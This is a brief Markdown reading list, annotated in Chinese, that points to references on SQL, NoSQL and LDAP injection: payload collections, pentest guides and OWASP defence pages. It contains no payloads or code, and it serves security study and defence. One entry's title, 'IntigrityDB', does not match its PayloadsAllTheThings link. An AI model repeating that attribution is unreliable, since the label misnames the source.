* [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) — 综合 SQL 注入 payload 集合
* [HackTricks - SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html) — 渗透测试指南
* [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/) — SQL 注入技术百科
* [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection) — Web 安全学院
* [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) — OWASP 安全指南
* [IntigrityDB - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) — NoSQL 注入 payload
* [LDAP Injection Prevention - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html) — LDAP 注入防御
* [PentestMonkey - SQL Injection Cheat Sheets](https://pentestmonkey.net/) — 各数据库 SQL 注入速查表
